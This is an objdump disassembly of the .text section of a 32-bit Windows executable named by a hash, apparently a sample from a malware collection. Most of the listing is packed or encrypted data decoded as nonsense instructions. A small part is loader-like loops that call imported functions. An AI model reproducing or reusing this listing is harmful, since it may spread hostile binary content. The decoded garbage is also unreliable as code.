
a377ed9121509dca84fae41b8a6fd7f6462ee7b2f0589f7094d04869f26c7fc3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a775
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0xb6030cf7
  40101f:	test   DWORD PTR [ebp+0x78],ecx
  401022:	js     0x40109c
  401024:	js     0x401024
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(6)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080abb
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz into 
  4010d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010d1:	retf   0x7b01
  4010d4:	(bad)  
  4010d5:	enter  0x3563,0xe7
  4010d9:	fadd   DWORD PTR [ebp-0x61]
  4010dc:	test   DWORD PTR [esi+0x10],eax
  4010df:	cdq    
  4010e0:	stos   DWORD PTR es:[edi],eax
  4010e1:	xchg   esi,eax
  4010e2:	nop
  4010e3:	lods   al,BYTE PTR ds:[esi]
  4010e4:	jae    0x4010a8
  4010e6:	iret   
  4010e7:	mov    eax,esi
  4010e9:	outs   dx,BYTE PTR ds:[esi]
  4010ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010eb:	push   ebx
  4010ec:	div    BYTE PTR [esi+0xb1c1a03]
  4010f2:	inc    esp
  4010f3:	test   al,0xcf
  4010f5:	or     DWORD PTR [esi+0x9],esp
  4010f8:	nop
  4010f9:	sub    BYTE PTR [ecx],bh
  4010fb:	sbb    eax,0x74d396b1
  401100:	sub    DWORD PTR [eax],0x36
  401103:	popf   
  401104:	pop    ebp
  401105:	bound  esi,QWORD PTR [edx+0x37f341f1]
  40110b:	dec    edx
  40110c:	mov    eax,DWORD PTR [ebp+0x47c36eb9]
  401112:	or     BYTE PTR [ecx+ecx*4],bl
  401115:	sub    DWORD PTR [edx+0x33cd77bf],edx
  40111b:	in     al,0x83
  40111d:	push   edx
  40111e:	jnp    0x401152
  401120:	outs   dx,BYTE PTR ds:[esi]
  401121:	ror    DWORD PTR [ecx],0x96
  401124:	fnstcw WORD PTR [esi-0x16]
  401127:	jp     0x401135
  401129:	out    0x47,eax
  40112b:	mov    bh,0xe
  40112d:	(bad)  
  40112e:	or     edi,DWORD PTR [esi+0x5324c34c]
  401134:	sbb    cl,BYTE PTR [ecx+0x9]
  401137:	sbb    eax,0x58987ee3
  40113c:	jmp    0x401198
  40113e:	and    BYTE PTR [ebp+0x25],bl
  401141:	mov    eax,0x6bac95da
  401146:	(bad)  
  401147:	mov    ecx,0xe59a938a
  40114c:	push   ds
  40114d:	jns    0x401108
  40114f:	push   cs
  401150:	mov    BYTE PTR [ecx-0x1a],dl
  401153:	push   0xdb7dce66
  401158:	lods   eax,DWORD PTR ds:[esi]
  401159:	mov    eax,ds:0x4350eced
  40115e:	out    dx,eax
  40115f:	sub    BYTE PTR [edi-0x617b306a],ah
  401165:	int3   
  401166:	adc    al,0x97
  401168:	inc    eax
  401169:	inc    ebx
  40116a:	cmp    BYTE PTR ds:0xc495d674,cl
  401170:	test   eax,0x138dca35
  401175:	adc    edi,ebp
  401177:	(bad)  
  401178:	jge    0x40114c
  40117a:	inc    ebx
  40117b:	mov    eax,0xd348141f
  401180:	inc    ebx
  401181:	jl     0x4011a8
  401183:	mov    dh,0xfa
  401185:	jg     0x4011e3
  401187:	cli    
  401188:	int3   
  401189:	and    dh,BYTE PTR [eax-0x25]
  40118c:	in     al,dx
  40118d:	xor    cl,ch
  40118f:	or     BYTE PTR [ebx-0x7943188a],dl
  401195:	mov    bh,0xca
  401197:	pop    esp
  401198:	lahf   
  401199:	push   ebp
  40119a:	inc    edx
  40119b:	scas   al,BYTE PTR es:[edi]
  40119c:	fsubr  QWORD PTR [esi]
  40119e:	addr16 es out dx,eax
  4011a1:	and    ebx,DWORD PTR [edi+0x7884d898]
  4011a7:	jp     0x401145
  4011a9:	mov    eax,ds:0xa83b263f
  4011ae:	mov    ebp,0x332bbc36
  4011b3:	jle    0x40117d
  4011b5:	xor    DWORD PTR [ebp-0x74cae86b],edx
  4011bb:	xor    ch,BYTE PTR [ecx]
  4011bd:	jp     0x401147
  4011bf:	cld    
  4011c0:	pop    ecx
  4011c1:	xchg   ecx,eax
  4011c2:	mov    ds:0xae845674,al
  4011c7:	cdq    
  4011c8:	jbe    0x4011c6
  4011ca:	ficomp DWORD PTR [edx+0x3f]
  4011cd:	cmp    eax,0x189c8e69
  4011d2:	xchg   BYTE PTR ss:[ebp+0x62],ch
  4011d6:	or     al,0x7
  4011d8:	mov    BYTE PTR [edx-0x6119ef47],ah
  4011de:	pusha  
  4011df:	mov    bl,BYTE PTR [ebx-0x77]
  4011e2:	and    eax,DWORD PTR [ecx-0x273a2185]
  4011e8:	cmp    cl,BYTE PTR [edi+0x7d]
  4011eb:	mov    ds:0x51f6d070,eax
  4011f0:	pop    ebp
  4011f1:	aaa    
  4011f2:	dec    esp
  4011f3:	scas   al,BYTE PTR es:[edi]
  4011f4:	out    0x56,eax
  4011f6:	pop    edx
  4011f7:	popa   
  4011f8:	fcmovnb st,st(7)
  4011fa:	pop    es
  4011fb:	sahf   
  4011fc:	stc    
  4011fd:	adc    esi,DWORD PTR [ecx+0x49043d17]
  401203:	daa    
  401204:	pusha  
  401205:	push   esi
  401206:	jge    0x401282
  401208:	gs xchg ebp,eax
  40120a:	dec    edx
  40120b:	sub    DWORD PTR [edx],edi
  40120d:	enter  0x574b,0xd9
  401211:	cmc    
  401212:	adc    edx,edx
  401214:	xchg   ebx,eax
  401215:	add    eax,0xabe077dc
  40121a:	and    DWORD PTR [esi-0x796f8811],0xc1483cba
  401224:	iret   
  401225:	mov    esp,0xc120da50
  40122a:	imul   edx,eax,0x0
  40122d:	sub    eax,0x168da5c6
  401232:	push   ebp
  401233:	bound  esp,QWORD PTR [esi+0x43]
  401236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401237:	sahf   
  401238:	in     al,dx
  401239:	std    
  40123a:	and    eax,0xffffff81
  40123d:	inc    esi
  40123e:	xchg   ebp,eax
  40123f:	fisub  DWORD PTR [ecx-0x5c]
  401242:	lods   eax,DWORD PTR ds:[esi]
  401243:	push   ds
  401244:	daa    
  401245:	loop   0x401226
  401247:	(bad)  
  401248:	jae    0x40124f
  40124a:	ret    0x4bec
  40124d:	mov    dh,0x73
  40124f:	out    dx,al
  401250:	add    BYTE PTR [ebp+0x5594c67b],ah
  401256:	push   edx
  401257:	repnz jmp 0x28f7:0x2c498067
  40125f:	mov    al,ds:0xf4819e29
  401264:	fnstcw WORD PTR [esp+edx*4+0x66b868e5]
  40126b:	inc    ebp
  40126c:	mov    ebp,DWORD PTR [esi+0x5f0b141a]
  401272:	jae    0x4012cc
  401274:	jmp    0x5ec4ffee
  401279:	inc    ebx
  40127a:	dec    esp
  40127b:	fisubr WORD PTR [ecx+edx*2-0xf225c6f]
  401282:	lods   al,BYTE PTR ds:[esi]
  401283:	xchg   ecx,eax
  401284:	cli    
  401285:	add    bh,bh
  401287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401288:	div    BYTE PTR [esi+0x4461b222]
  40128e:	push   edi
  40128f:	pop    ecx
  401290:	pmaddwd mm7,mm1
  401293:	pop    edx
  401294:	and    eax,0xc5799b9f
  401299:	(bad)
  40129d:	pop    edi
  40129e:	lods   al,BYTE PTR ds:[esi]
  40129f:	pop    ebp
  4012a0:	and    al,0x37
  4012a2:	test   al,0x7b
  4012a4:	jg     0x4012c6
  4012a6:	push   edx
  4012a7:	fstp   TBYTE PTR [ebp-0x195e8510]
  4012ad:	jmp    0xa80d:0x15310041
  4012b4:	inc    edx
  4012b5:	add    BYTE PTR [ebx+0x19880],cl
  4012bb:	add    BYTE PTR [ebx+0x42a7c10d],cl
  4012c1:	add    BYTE PTR [ecx],cl
  4012c3:	or     eax,0x42a76d
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a75d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7c1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7b5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a839,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a839
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a839,ebx
  401312:	cmp    DWORD PTR ds:0x42a839,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a839,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a781,0x42a805
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a809,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a809
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a809,edi
  401361:	cmp    DWORD PTR ds:0x42a809,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a809,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a809,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a809
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a809,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7b5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a76d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a76d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a76d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7b5
  4013d7:	push   0x0
  4013d9:	push   0x42a9cd
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a76d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a76d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a76d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a76d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a76d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx+0x42],1
  401422:	shr    BYTE PTR [ecx+0x787efe56],1
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x401487
  40142e:	(bad)  [eax+0x5c9bea94]
  401434:	cmc    
  401435:	arpl   bp,cx
  401437:	sub    edx,DWORD PTR [ebp-0x7abae258]
  40143d:	lds    esp,FWORD PTR [esi+ebp*4+0x4d]
  401441:	push   0xffffffaf
  401443:	jmp    0x401440
  401445:	xchg   esi,eax
  401446:	icebp  
  401447:	int3   
  401448:	arpl   WORD PTR [edx],sp
  40144a:	sbb    ebp,ecx
  40144c:	jecxz  0x4013f5
  40144e:	cld    
  40144f:	iret   
  401450:	je     0x4014bd
  401452:	jnp    0x4013f7
  401454:	and    al,0x7a
  401456:	hlt    
  401457:	and    BYTE PTR [edi-0x40a5cb71],ah
  40145d:	enter  0x6e71,0xd5
  401461:	scas   eax,DWORD PTR es:[edi]
  401462:	scas   eax,DWORD PTR es:[edi]
  401463:	push   0x7f5f05c5
  401468:	jns    0x4014b4
  40146a:	cmp    eax,0x17b4da6b
  40146f:	mov    edx,0x9bba9685
  401474:	xchg   DWORD PTR [ebx-0x72],esi
  401477:	call   0x3bfc157d
  40147c:	add    BYTE PTR ds:[ecx+0xb],dl
  401480:	in     eax,dx
  401481:	jbe    0x4014c0
  401483:	jnp    0x401482
  401485:	fsub   st,st(6)
  401487:	addr16 push esp
  401489:	lods   al,BYTE PTR ds:[esi]
  40148a:	repz push ss
  40148c:	shl    ebx,1
  40148e:	inc    esp
  40148f:	dec    ebx
  401490:	cmp    edi,edx
  401492:	loop   0x40150f
  401494:	dec    ebp
  401495:	sar    BYTE PTR [edx],cl
  401497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401498:	jne    0x401439
  40149a:	sub    BYTE PTR [ebx],0xdb
  40149d:	pop    ecx
  40149e:	out    dx,eax
  40149f:	cdq    
  4014a0:	fadd   QWORD PTR [esi+0xb]
  4014a3:	out    dx,eax
  4014a4:	and    al,0x51
  4014a6:	out    0xe9,eax
  4014a8:	imul   esp,DWORD PTR [ecx],0x68
  4014ab:	mov    ebp,0xe235e5f5
  4014b0:	dec    eax
  4014b1:	sub    al,0x52
  4014b3:	jo     0x401512
  4014b5:	shl    dh,1
  4014b7:	xor    al,0xec
  4014b9:	xor    DWORD PTR [esi+0x5d57725e],ebx
  4014bf:	add    eax,0xc7c7ff2f
  4014c4:	dec    esp
  4014c5:	hlt    
  4014c6:	pop    es
  4014c7:	call   0xa1219953
  4014cc:	adc    al,0xf0
  4014ce:	jl     0x4014a9
  4014d0:	ja     0x401468
  4014d2:	inc    esp
  4014d3:	lock xor dl,bh
  4014d6:	into   
  4014d7:	loopne 0x401524
  4014d9:	ins    DWORD PTR es:[edi],dx
  4014da:	sbb    BYTE PTR [edx+0x31],0xce
  4014de:	ins    BYTE PTR es:[edi],dx
  4014df:	out    dx,eax
  4014e0:	call   0xeb6b98f8
  4014e5:	sbb    al,0xa0
  4014e7:	addr16 call 0x29172294
  4014ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014ee:	in     al,dx
  4014ef:	sbb    DWORD PTR [edi],ebx
  4014f1:	ins    BYTE PTR es:[edi],dx
  4014f2:	data16 mov bl,BYTE PTR [edx]
  4014f5:	stc    
  4014f6:	mov    cl,0xe4
  4014f8:	mov    ecx,0x12bf5eac
  4014fd:	icebp  
  4014fe:	cmp    edi,esi
  401500:	int3   
  401501:	js     0x401562
  401503:	lock in al,0x5a
  401506:	and    BYTE PTR [ebx-0x51],0x14
  40150a:	iret   
  40150b:	mov    ah,0xe8
  40150d:	sbb    DWORD PTR [edi-0x7de23c18],0xfc211874
  401517:	inc    esp
  401518:	jl     0x4014a6
  40151a:	nop
  40151b:	push   ecx
  40151c:	enter  0x9a6c,0xfb
  401520:	adc    BYTE PTR [edx],ch
  401522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401523:	pop    ss
  401524:	test   BYTE PTR [esi+0x3b],ah
  401527:	lds    edx,FWORD PTR ds:0xc42cc0f0
  40152d:	ins    DWORD PTR es:[edi],dx
  40152e:	loope  0x401506
  401530:	mov    ds:0x98e176c,eax
  401535:	xor    cl,dh
  401537:	or     eax,0x2ea87e10
  40153c:	push   cs
  40153d:	sub    ah,BYTE PTR [edi]
  40153f:	jo     0x40150d
  401541:	inc    esp
  401542:	inc    ebp
  401543:	mov    esi,0xd24a0078
  401548:	inc    edi
  401549:	fldz   
  40154b:	mov    ds:0x15eb575d,eax
  401550:	scas   eax,DWORD PTR es:[edi]
  401551:	sub    eax,0x569547ca
  401556:	fild   QWORD PTR [esp+esi*4+0x4913e27d]
  40155d:	shl    esi,1
  40155f:	retf   0xb017
  401562:	xchg   ebp,eax
  401563:	mov    DWORD PTR ds:[esi-0x54],esi
  401567:	(bad)  
  401568:	aad    0x28
  40156a:	sub    al,0x49
  40156c:	mov    DWORD PTR [edi-0x197e4631],ebp
  401572:	out    dx,eax
  401573:	jae    0x40151a
  401575:	sub    dl,BYTE PTR [esi-0x32]
  401578:	mov    ebp,0xba0a0f07
  40157d:	test   DWORD PTR [ebp+0xb],edi
  401580:	or     al,0xa3
  401582:	stos   BYTE PTR es:[edi],al
  401583:	cmp    eax,0xbd02238d
  401588:	mov    ebx,0x4e0d1da1
  40158d:	pop    ebx
  40158e:	jns    0x4015c8
  401590:	xchg   BYTE PTR [ebx],bl
  401592:	sub    eax,0x6d6f96cd
  401597:	fcomp  QWORD PTR [ebx+0x3c]
  40159a:	pop    edi
  40159b:	push   esi
  40159c:	xchg   esi,eax
  40159d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40159e:	mov    BYTE PTR [esi],al
  4015a0:	test   al,0xed
  4015a2:	aaa    
  4015a3:	ins    DWORD PTR es:[edi],dx
  4015a4:	jecxz  0x40157d
  4015a6:	cli    
  4015a7:	cli    
  4015a8:	mov    ds:0x88415c97,eax
  4015ad:	scas   al,BYTE PTR es:[edi]
  4015ae:	pop    ecx
  4015af:	daa    
  4015b0:	jmp    0x40155b
  4015b2:	outs   dx,BYTE PTR ds:[esi]
  4015b3:	(bad)  
  4015b4:	outs   dx,BYTE PTR ds:[esi]
  4015b5:	sahf   
  4015b6:	push   cs
  4015b7:	add    BYTE PTR [eax],cl
  4015b9:	pushf  
  4015ba:	pop    eax
  4015bb:	push   ds
  4015bc:	lea    ecx,[ecx+0x1e9739bc]
  4015c2:	leave  
  4015c3:	inc    eax
  4015c4:	lods   eax,DWORD PTR ds:[esi]
  4015c5:	rcr    BYTE PTR [ecx-0x62e47b73],1
  4015cb:	retf   0x115b
  4015ce:	sub    eax,ecx
  4015d0:	std    
  4015d1:	mov    cl,0x7
  4015d3:	arpl   WORD PTR [ebx+0x77],si
  4015d6:	test   al,0xd7
  4015d8:	data16 idiv BYTE PTR [edx+0x1c]
  4015dc:	dec    edx
  4015dd:	addr16 loop 0x40161d
  4015e0:	cli    
  4015e1:	test   al,0x83
  4015e3:	bound  edi,QWORD PTR [eax]
  4015e5:	das    
  4015e6:	int    0xce
  4015e8:	mov    bh,0x77
  4015ea:	and    bl,BYTE PTR [ebx-0x5b345515]
  4015f0:	and    al,0x49
  4015f2:	push   ss
  4015f3:	jg     0x4015db
  4015f5:	daa    
  4015f6:	stos   DWORD PTR es:[edi],eax
  4015f7:	dec    ebp
  4015f8:	sub    al,0x80
  4015fa:	(bad)  
  4015fb:	adc    bh,al
  4015fd:	jmp    0x3289:0xcc79396
  401604:	(bad)  
  401606:	lods   eax,DWORD PTR ds:[esi]
  401607:	sar    BYTE PTR [esp+ebp*1-0x1cc3f89c],cl
  40160e:	enter  0x7d58,0xba
  401612:	iret   
  401613:	popa   
  401614:	inc    edx
  401615:	mov    eax,ds:0xca096c9f
  40161a:	data16 je 0x40169a
  40161d:	or     dh,BYTE PTR [eax]
  40161f:	ins    BYTE PTR es:[edi],dx
  401620:	int    0x86
  401622:	lahf   
  401623:	push   ss
  401624:	and    eax,0x7c009ae3
  401629:	sub    al,0x5a
  40162b:	imul   edi,DWORD PTR [edx+eiz*1+0x76d1cfe8],0xffffffcc
  401633:	cmp    DWORD PTR [ecx],esp
  401635:	sub    DWORD PTR [edx-0x44c48a32],ecx
  40163b:	es pop ecx
  40163d:	adc    BYTE PTR [esi-0xf],dl
  401640:	xor    eax,0x69b7677c
  401645:	dec    esp
  401646:	ret    0xf8ef
  401649:	sub    DWORD PTR [ebx-0x6a],edx
  40164c:	and    BYTE PTR [edi],bl
  40164e:	cmp    ebp,0xffffff94
  401651:	cmp    DWORD PTR [ebx-0x686d73db],0xffffffee
  401658:	lock fst DWORD PTR [eax]
  40165b:	outs   dx,DWORD PTR ds:[esi]
  40165c:	or     bl,BYTE PTR [ecx+0x52]
  40165f:	int    0x9e
  401661:	daa    
  401662:	jge    0x40163a
  401664:	sbb    eax,0x20ddd9fe
  401669:	js     0x4016ab
  40166b:	addr16 test eax,0xad0c0a9e
  401671:	push   cs
  401672:	push   cs
  401673:	js     0x40160c
  401675:	imul   esi,DWORD PTR [ecx],0x9d372691
  40167b:	mov    ds:0x35f4993c,al
  401680:	xchg   edx,eax
  401681:	(bad)  
  401682:	push   ecx
  401683:	add    cl,ch
  401685:	pop    eax
  401686:	jae    0x401633
  401688:	mov    edi,0x519d26fc
  40168d:	loopne 0x4016ed
  40168f:	int3   
  401690:	xor    DWORD PTR [ebp+0x44],ebp
  401693:	dec    ebx
  401694:	mov    WORD PTR [edx-0x53f69cd8],cs
  40169a:	test   eax,0x30092b3d
  40169f:	fnsave [edx+0x614376f0]
  4016a5:	xchg   esi,eax
  4016a6:	mov    WORD PTR [ebp+0x454a5a76],?
  4016ac:	add    bh,bh
  4016ae:	push   0x3
  4016b0:	mov    DWORD PTR [ecx+0x42a84d35],0x53dc00
  4016ba:	add    BYTE PTR [ecx-0x46c2eeff],cl
  4016c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c1:	inc    edx
  4016c2:	add    BYTE PTR [ebp+0xd81fc45],cl
  4016c8:	imul   esp,DWORD PTR [edi-0x58a2ffbe],0x45890042
  4016d2:	lock xor DWORD PTR ds:0x42a76d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz mov WORD PTR [ebx+ebx*2],ds
  4016f7:	scas   eax,DWORD PTR es:[edi]
  4016f8:	jl     0x4016fd
  4016fa:	js     0x401774
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x4016e9
  401701:	inc    edx
  401702:	test   eax,0xdd1a5e3a
  401707:	mov    eax,0x67a1698
  40170c:	inc    edx
  40170d:	add    al,BYTE PTR [esi+0x6bc16022]
  401713:	jge    0x4016d9
  401715:	push   ebx
  401716:	and    al,0xf7
  401718:	push   esp
  401719:	daa    
  40171a:	imul   BYTE PTR [edx+0x60]
  40171d:	hlt    
  40171e:	jbe    0x4016e8
  401720:	(bad)  
  401721:	mov    ?,WORD PTR [ebp+esi*8-0x74]
  401725:	std    
  401726:	gs lock push ds
  401729:	imul   eax,DWORD PTR [edi-0x19],0x38e2ed92
  401730:	jb     0x401708
  401732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401733:	fcmovne st,st(4)
  401735:	out    0x25,eax
  401737:	stos   DWORD PTR es:[edi],eax
  401738:	out    0x68,al
  40173a:	jne    0x40178f
  40173c:	jae    0x401709
  40173e:	cmc    
  40173f:	push   ss
  401740:	out    0x3c,eax
  401742:	mov    BYTE PTR [edi-0x6695dbdb],ah
  401748:	and    al,0xf1
  40174a:	bound  esi,QWORD PTR [edi+esi*1-0x30]
  40174e:	xor    eax,0x3f36ffbc
  401753:	add    esi,DWORD PTR [ebx+0x1a0744ff]
  401759:	rol    DWORD PTR [eax],cl
  40175b:	shr    cl,cl
  40175d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40175e:	shr    BYTE PTR [edx+edx*2+0x4c],cl
  401762:	sub    BYTE PTR [edi+0x7c4fb00],dl
  401768:	inc    ebp
  401769:	dec    edi
  40176a:	inc    ax
  40176c:	sub    eax,DWORD PTR [eax]
  40176e:	xchg   esp,eax
  40176f:	adc    al,0x42
  401771:	(bad)  
  401772:	in     eax,0x54
  401774:	mov    al,0xa8
  401776:	es iret 
  401778:	xchg   esp,eax
  401779:	jo     0x4017ad
  40177b:	sub    eax,0xfa07fe91
  401780:	push   ebp
  401781:	fbld   TBYTE PTR [esp+ebx*2]
  401784:	mov    al,ds:0x8783b0ea
  401789:	xchg   DWORD PTR [edx],ebp
  40178b:	sub    eax,0xd59c8688
  401790:	aad    0x94
  401792:	aaa    
  401793:	sub    ah,BYTE PTR [edi+0x31bb3ecd]
  401799:	mov    eax,DWORD PTR [edi+esi*4+0x2029df8f]
  4017a0:	in     eax,dx
  4017a1:	xchg   ebx,eax
  4017a2:	cmp    DWORD PTR [ebp+0x29],esi
  4017a5:	cmc    
  4017a6:	sbb    eax,0xadb4949d
  4017ab:	sbb    eax,0xd816643c
  4017b0:	mov    edx,DWORD PTR [esi+0x14]
  4017b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017b4:	mov    esp,0xbb42f740
  4017b9:	adc    al,0xa7
  4017bb:	not    al
  4017bd:	adc    DWORD PTR [ebp+0x57],edi
  4017c0:	push   edi
  4017c1:	in     eax,0xc9
  4017c3:	js     0x401783
  4017c5:	out    dx,al
  4017c6:	xchg   edi,eax
  4017c7:	push   esp
  4017c8:	pop    ebx
  4017c9:	pop    ebp
  4017ca:	(bad)  [eax]
  4017cc:	xor    bl,BYTE PTR [edx+0x3b]
  4017cf:	or     ah,BYTE PTR [ebx]
  4017d1:	mov    bh,0x3b
  4017d3:	sbb    BYTE PTR [eax+0x53],bl
  4017d6:	jmp    0x401769
  4017d8:	js     0x40183e
  4017da:	inc    eax
  4017db:	dec    eax
  4017dc:	in     eax,dx
  4017dd:	leave  
  4017de:	addr16 cmc 
  4017e0:	(bad)  
  4017e1:	int    0x59
  4017e3:	sar    DWORD PTR ss:[ecx+0x4c194b5f],1
  4017ea:	cmp    DWORD PTR ds:0x103645a0,eax
  4017f0:	retfw  
  4017f2:	lea    edx,[edx]
  4017f4:	lea    edx,[ebx-0x30eff078]
  4017fa:	or     BYTE PTR [esi+edx*4+0x6],al
  4017fe:	outs   dx,DWORD PTR ds:[esi]
  4017ff:	sbb    al,bh
  401801:	add    DWORD PTR [ebp+0x3978a221],ecx
  401807:	fucomp st(7)
  401809:	jp     0x4017f2
  40180b:	(bad)  
  40180c:	cmp    eax,0x80056c6f
  401811:	add    al,0xad
  401813:	imul   esi,DWORD PTR [edx],0x7fbab8fb
  401819:	jbe    0x40188d
  40181b:	mov    esi,DWORD PTR [esi+0x58081ccd]
  401821:	lahf   
  401822:	aaa    
  401823:	sbb    esp,eax
  401825:	xchg   ebx,eax
  401826:	ficomp DWORD PTR [edx+esi*1]
  401829:	and    dl,BYTE PTR [edx+0x26738bbd]
  40182f:	xor    bl,cl
  401831:	push   edi
  401832:	aas    
  401833:	aaa    
  401834:	test   al,0xeb
  401836:	push   ds
  401837:	mov    bl,0xdc
  401839:	cmp    al,0x3
  40183b:	mov    ds:0x6b2bfb18,al
  401840:	dec    ebx
  401841:	rcl    DWORD PTR [edx+0x2f7cd304],1
  401847:	sub    BYTE PTR [ebx-0x1628862b],ch
  40184d:	pop    esi
  40184e:	inc    ebx
  40184f:	repz test DWORD PTR [ecx+0x781da460],0x7878589
  40185a:	push   ss
  40185b:	stos   BYTE PTR es:[edi],al
  40185c:	pop    eax
  40185d:	cmp    ecx,ebp
  40185f:	cmp    edi,ecx
  401861:	pop    esp
  401862:	lock nop
  401864:	jo     0x4018c0
  401866:	inc    edx
  401867:	cld    
  401868:	leave  
  401869:	shl    DWORD PTR [eax],cl
  40186b:	jecxz  0x40188f
